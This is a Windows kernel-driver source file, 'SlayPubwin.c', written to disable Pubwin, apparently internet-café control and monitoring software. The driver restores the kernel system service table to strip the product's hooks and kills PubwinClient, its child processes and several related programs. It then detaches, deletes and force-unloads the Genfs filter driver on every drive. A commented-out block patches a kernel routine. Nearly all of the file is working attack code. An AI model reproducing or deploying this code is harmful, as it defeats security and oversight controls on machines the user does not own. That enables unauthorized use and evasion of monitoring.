// SlayPubwin.c
//
// Generated by C DriverWizard 3.2.0 (Build 2485)
// Requires DDK Only
// File created on 10/14/2008
// By Proton.

#include "pch.h"
#include "..\intrface.h"

#define SEC_FILE           0x800000     
#define SEC_IMAGE         0x1000000     
#define SEC_VLM           0x2000000     
#define SEC_RESERVE       0x4000000     
#define SEC_COMMIT        0x8000000     
#define SEC_NOCACHE      0x10000000

#define RETURN_ON_FAIL() if(!NT_SUCCESS(status)) return status

extern "C"
NTSTATUS 
  ZwCreateSection(
    OUT PHANDLE  SectionHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER  MaximumSize OPTIONAL,
    IN ULONG  SectionPageProtection,
    IN ULONG  AllocationAttributes,
    IN HANDLE  FileHandle OPTIONAL
    ); 

VOID FakeDriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	//Nothing to do.
	//Cannot free leaked pools.
}

NTSTATUS ExtractEProcess(PEPROCESS pEP,PEPROCESS_EXTRACT pEE)
{
	PLIST_ENTRY l;
	switch(*NtBuildNumber)
	{
	case 2600: //Windows XP
		pEE->ImageFileName=(LPSTR)((ULONG)pEP)+0x174;
		pEE->pPeb=(PPEB)(*(ULONG*)(((ULONG)pEP)+0x1B0));
		pEE->UniqueProcessID=*(ULONG*)(((ULONG)pEP)+0x084);
		pEE->InheritedFromUniqueProcessId=*(ULONG*)(((ULONG)pEP)+0x14c);
		pEE->ObjectTable=(PHANDLE_TABLE)(*(ULONG*)(((ULONG)pEP)+0x0c4));
		l=(PLIST_ENTRY)(((ULONG)pEP)+0x088);
		pEE->Forwarder=(PEPROCESS)(((ULONG)l->Flink)-0x88);
		pEE->Backwarder=(PEPROCESS)(((ULONG)l->Blink)-0x88);
		return STATUS_SUCCESS;
	default:
		return STATUS_NOT_IMPLEMENTED;
	}
}

NTSTATUS TerminateProcessByProcessId(IN ULONG ProcessId)
{
	OBJECT_ATTRIBUTES oa;
	CLIENT_ID ci;
	NTSTATUS status=STATUS_SUCCESS;
	HANDLE hProc;
	PEPROCESS pEP;
	LARGE_INTEGER ll;

	InitializeObjectAttributes(
		&oa,
		NULL,
		NULL,
		NULL,
		NULL
		);
	ci.UniqueProcess=(HANDLE)ProcessId;
	ci.UniqueThread=0;
	status=ZwOpenProcess(
		&hProc,
		1, //PROCESS_TERMINATE
		&oa,
		&ci
		);
	if(NT_SUCCESS(status))
	{
		status=ObReferenceObjectByHandle(
			hProc,
			SYNCHRONIZE,
			NULL,
			KernelMode,
			(PVOID*)&pEP,
			NULL
			);
		
		RETURN_ON_FAIL();

		status=ZwTerminateProcess(hProc,0);

		ll.QuadPart=Int32x32To64(500,-10000);
		KeWaitForSingleObject(
			pEP,
			Executive,
			KernelMode,
			FALSE,
			&ll
			);

		ObDereferenceObject(pEP);
		ZwClose(hProc);
	}
	return status;
}

NTSTATUS KillRelatedProcesses()
{
	STRING sMainPro,sSeed,sDest,sFilemon,sAnnex;
	PEPROCESS pEP,pEPi;
	EPROCESS_EXTRACT pEE;
	NTSTATUS status=STATUS_SUCCESS;

	RtlInitString(&sMainPro,"MainPro.exe");
	RtlInitString(&sSeed,"Seed.exe");
	RtlInitString(&sFilemon,"filemon.exe");
	RtlInitString(&sAnnex,"AnnexPro.exe");

	pEP=IoGetCurrentProcess();
	
	ExtractEProcess(pEP,&pEE);
	pEPi=pEP;
	do 
	{
		RtlInitString(&sDest,pEE.ImageFileName);
		KdPrint(("%s\n",pEE.ImageFileName));
		if (RtlCompareString(&sDest,&sMainPro,TRUE)==0 ||
			RtlCompareString(&sDest,&sSeed,TRUE)==0 ||
			RtlCompareString(&sDest,&sFilemon,TRUE)==0 ||
			RtlCompareString(&sDest,&sAnnex,TRUE)==0 
			)
		{
			status=TerminateProcessByProcessId(pEE.UniqueProcessID);
			//TerminateProcessByProcessId(pEE.InheritedFromUniqueProcessId);
		}
		pEP=pEE.Forwarder;
		ExtractEProcess(pEP,&pEE);
	} while (pEP!=pEPi);
	return status;
}

NTSTATUS EliminateEvilGenfs(char cDrvLetter,PDRIVER_OBJECT* ppDrvObjGenfs)
{
	UNICODE_STRING us,usGenfs;
	NTSTATUS status=STATUS_SUCCESS;
	USHORT buf[]=L"\\??\\C:\\";
	HANDLE hDrv;
	OBJECT_ATTRIBUTES oa;
	IO_STATUS_BLOCK stStatusBlock;
	PFILE_OBJECT pfi;
	PDEVICE_OBJECT pdev,pdevtmp;
	PDRIVER_OBJECT pdrv,pDrvObjGenfs;

	buf[4]=(USHORT)cDrvLetter;
	RtlInitUnicodeString(&us,buf);
	RtlInitUnicodeString(&usGenfs,L"\\Driver\\Genfs");
	
	InitializeObjectAttributes(
		&oa,
		&us,
		OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,
		NULL,
		NULL
		);
	
	status=ZwCreateFile(
		&hDrv,
		SYNCHRONIZE,
		&oa,
		&stStatusBlock,
		NULL,
		NULL,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		FILE_OPEN,
		FILE_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		NULL
		);
	KdPrint(("ZwCreateFile: RET: %08lX, hDrv:%08lX\n",status,hDrv));
	RETURN_ON_FAIL();
	
	status=ObReferenceObjectByHandle(
		hDrv,
		FILE_READ_DATA,
		NULL,
		KernelMode,
		(PVOID*)&pfi,
		NULL
		);
	KdPrint(("ObRef: RET: %08lX, pfi:%08lX\n",status,pfi));
	ZwClose(hDrv);

	RETURN_ON_FAIL();

	pdev=pfi->DeviceObject->Vpb->DeviceObject;
	
	KdPrint(("DevObj: %08lX\n",pdev));
	//status=ObReferenceObjectByPointer(pdev,NULL,NULL,KernelMode);
	ObDereferenceObject(pfi);

	//RETURN_ON_FAIL();
	
	while(pdev->AttachedDevice)
	{
		if(RtlCompareUnicodeString(&pdev->AttachedDevice->DriverObject->DriverName,&usGenfs,TRUE)==0)
		{
			pdevtmp=pdev->AttachedDevice;
			pDrvObjGenfs=pdevtmp->DriverObject;
			if(pdev->Timer)
				IoStopTimer(pdev);
			IoDetachDevice(pdev);
			IoDeleteDevice(pdevtmp);
			if(ppDrvObjGenfs)
				*ppDrvObjGenfs=pDrvObjGenfs;
			KdPrint(("DETACHING!!!\n"));
			break;
		}
		pdev=pdev->AttachedDevice;
	}
	return status;
}

NTSTATUS DriverEntry(
    IN  PDRIVER_OBJECT  DriverObject,
    IN  PUNICODE_STRING RegistryPath
    )
{
	ULONG tmp,pidPubwin=0,i;
	ULONG dwViewSize=0;
	UNICODE_STRING us;
	OBJECT_ATTRIBUTES oaNtoskrnl,oa;
	PVOID pmi;
	SYSTEM_MODULE smNtoskrnl,*psm;
	NTSTATUS status;
	HANDLE hNtoskrnl=0,hSection=0;
	PVOID pNtoskrnl=0;
	CHAR buf[MAXIMUM_FILENAME_LENGTH]="\\SystemRoot\\system32\\",c;
	PDRIVER_OBJECT pDrvGenfs=0;
	PDEVICE_OBJECT pdev,pdevtmp;
	IO_STATUS_BLOCK stStatusBlock;
	STRING sPubwin,/*sCsrss,sSmss,*/sDest,sNtoskrnl,sNtkrnlpa,sNtkrnlmp,sNtkrpamp,as;
	PEPROCESS pEP,pEPi;
	EPROCESS_EXTRACT pEE;

	/*  ^_^ A better plan has been found!
	//Cripple HalReturnToFirmware
	RtlInitUnicodeString(&us,L"HalReturnToFirmware");
	tmp=MmGetSystemRoutineAddress(&us);
	
	DisableWP();
	*tmp=0xCC0004C2; // RETN 4 & INT3
	EnableWP();
	*/


	//////////////////////////////////////////////////////////////////////////
	//			                   TEST ZONE                                //
	//////////////////////////////////////////////////////////////////////////
	
	//return STATUS_UNSUCCESSFUL;
	
	//////////////////////////////////////////////////////////////////////////
	//                   Mission One Start -> Recover SSDT                  //
	//////////////////////////////////////////////////////////////////////////
	RtlInitString(&sNtoskrnl,"ntoskrnl.exe");
	RtlInitString(&sNtkrnlpa,"ntkrnlpa.exe");
	RtlInitString(&sNtkrnlmp,"ntkrnlmp.exe");
	RtlInitString(&sNtkrpamp,"ntkrpamp.exe");

	pmi=ExAllocatePool(PagedPool,0x10000);
	if(!NT_SUCCESS(status=ZwQuerySystemInformation(SystemModuleInformation,pmi,0x10000,NULL)))
	{
		ExFreePool(pmi);
		return status;
	}
	for(i=0;;i++)
	{
		psm=&(((PSYSTEM_MODULE_INFORMATION)pmi)->Modules[i]);

		RtlInitString(&sDest,(PCSZ)&(psm->Name[psm->NameOffset]));

		if (RtlCompareString(&sDest,&sNtoskrnl,TRUE)==0 ||
			RtlCompareString(&sDest,&sNtkrnlpa,TRUE)==0 ||
			RtlCompareString(&sDest,&sNtkrnlmp,TRUE)==0 ||
			RtlCompareString(&sDest,&sNtkrpamp,TRUE)==0)
		{
			smNtoskrnl=*psm;
			break;
		}
	}
	
	
	ExFreePool(pmi);

	KdPrint(("ntos: %08lX,%08lX\n",smNtoskrnl.ImageBaseAddress,smNtoskrnl.ImageSize));

	RtlStringCbCatA(buf,MAXIMUM_FILENAME_LENGTH,(PCHAR)&smNtoskrnl.Name[smNtoskrnl.NameOffset]);

	KdPrint(("%s\n",buf));

	RtlInitString(&as,(PCSZ)buf);
	RtlAnsiStringToUnicodeString(&us,&as,TRUE);
	
	InitializeObjectAttributes(&oaNtoskrnl,&us,OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,NULL,NULL);

	status=ZwCreateFile(
		&hNtoskrnl,
		FILE_READ_DATA,
		&oaNtoskrnl,
		&stStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		FILE_OPEN,
		NULL,
		NULL,
		NULL);

	RtlFreeUnicodeString(&us);

	if(!NT_SUCCESS(status))
	{
		KdPrint(("Failed ZwCreateFile!\n"));
		return status;
	}
	
	InitializeObjectAttributes(&oa,NULL,OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,NULL,NULL);

	status=ZwCreateSection(
		&hSection,
		SECTION_MAP_READ,
		&oa,
		NULL,
		PAGE_READONLY,
		SEC_IMAGE,
		hNtoskrnl
		);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("Failed ZwCreateSection!\n"));
		ZwClose(hNtoskrnl);
		return status;
	}
	
	status=ZwMapViewOfSection(
		hSection,
		NtCurrentProcess(),
		&pNtoskrnl,
		16,
		NULL,
		NULL,
		&dwViewSize,
		ViewUnmap,
		NULL,
		PAGE_READWRITE
		);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("Failed ZwMapViewOfSection! %08lX\n",status));
		ZwClose(hSection);
		ZwClose(hNtoskrnl);
		return status;
	}
	
	KdPrint(("Initialize finished!\n%08lX\n",pNtoskrnl));
	
	if((ULONG)(KeServiceDescriptorTable->ServiceTableBase)-((ULONG)smNtoskrnl.ImageBaseAddress)<dwViewSize)
	{
		//hhhbl!!!!!!!!!
		
		i=RtlImageNtHeader(pNtoskrnl)->OptionalHeader.ImageBase;

		__asm
		{
			pushad;
			mov edx,KeServiceDescriptorTable;
			mov edi,[edx]; //ServiceTableBase
			mov ecx,[edx+8]; // Count
			mov esi,edi;
			mov edx,smNtoskrnl.ImageBaseAddress;
			sub esi,edx;
			add esi,pNtoskrnl; //esi==SSDT in map , edi==Current SSDT
			sub edx,i;	//Damn it! Though mapped with SEC_IMAGE signature, Windows doesn't handle relocations!

looop:		
			lodsd;   //Perform the critical and evil thing....
			add eax,edx;
			stosd;
			loop looop;

			//mov eax,0x84065234; // for test purpose
			//stosd
			popad;
		}
	}
	
	KdPrint(("pNtoskrnl: %08lX\n",pNtoskrnl));
	ZwUnmapViewOfSection(NtCurrentProcess(),pNtoskrnl);
	ZwClose(hSection);
	ZwClose(hNtoskrnl);
	//////////////////////////////////////////////////////////////////////////
	
	//////////////////////////////////////////////////////////////////////////
	//         Mission Two Start -> Eliminate user mode applications        //
	//////////////////////////////////////////////////////////////////////////

	RtlInitString(&sPubwin,"PubwinClient.ex");

	pEP=IoGetCurrentProcess();
	
	ExtractEProcess(pEP,&pEE);
	pEPi=pEP;
	do 
	{
		RtlInitString(&sDest,pEE.ImageFileName);
		KdPrint(("%s\n",pEE.ImageFileName));
		if(RtlCompareString(&sDest,&sPubwin,TRUE)==0)
		{
			pidPubwin=pEE.UniqueProcessID;
			TerminateProcessByProcessId(pidPubwin);
			//TerminateProcessByProcessId(pEE.InheritedFromUniqueProcessId);
			break;
		}
		pEP=pEE.Forwarder;
		ExtractEProcess(pEP,&pEE);
	} while (pEP!=pEPi);

	if(pidPubwin)
	{
		KdPrint(("PidPub: %ld\n",pidPubwin));
		ExtractEProcess(pEP,&pEE);
		pEPi=pEP;
		do 
		{
			if(pEE.InheritedFromUniqueProcessId==pidPubwin)
			{
				TerminateProcessByProcessId(pEE.UniqueProcessID);
			}
			pEP=pEE.Forwarder;
			ExtractEProcess(pEP,&pEE);
		} while (pEP!=pEPi);
	}
	
	KillRelatedProcesses();

	//////////////////////////////////////////////////////////////////////////

	//////////////////////////////////////////////////////////////////////////
	//                 Mission Three Start -> Detach Genfs                  //
	//////////////////////////////////////////////////////////////////////////
	EliminateEvilGenfs('C',&pDrvGenfs);
	for(c='D';c<='Z';c++)
	{
		EliminateEvilGenfs(c,NULL);
	}
	//////////////////////////////////////////////////////////////////////////


	//////////////////////////////////////////////////////////////////////////
	//          Mission Four Start -> Stop the Evil Timer of Genfs          //
	//////////////////////////////////////////////////////////////////////////
	if(pDrvGenfs)
	{
		pdev=pDrvGenfs->DeviceObject;
		while(pdev)
		{
			if(pdev->Timer)
				IoStopTimer(pdev);
			pdev=pdev->NextDevice;
		}
	}
	//////////////////////////////////////////////////////////////////////////
	
	//////////////////////////////////////////////////////////////////////////
	//                 Final Mission Start -> Eliminate Genfs               //
	//////////////////////////////////////////////////////////////////////////
	if(pDrvGenfs)
	{
		pdev=pDrvGenfs->DeviceObject;
		while(pdev) 
		{
			pdevtmp=pdev->NextDevice;
			IoDeleteDevice(pdev);
			pdev=pdevtmp;
		}
		
		RtlInitUnicodeString(&us,L"\\??\\Pubwin");
		IoDeleteSymbolicLink(&us);
		
		pDrvGenfs->DriverUnload=FakeDriverUnload;
		
		RtlInitUnicodeString(&us,L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Genfs");
		status=ZwUnloadDriver(&us);
		
		RETURN_ON_FAIL();
	}
	//////////////////////////////////////////////////////////////////////////
    
	//////////////////////////////////////////////////////////////////////////
	//                         MISSION ALL OVER !!!!                        //
	//////////////////////////////////////////////////////////////////////////

	return STATUS_UNSUCCESSFUL;
	//////////////////////////////////////////////////////////////////////////
}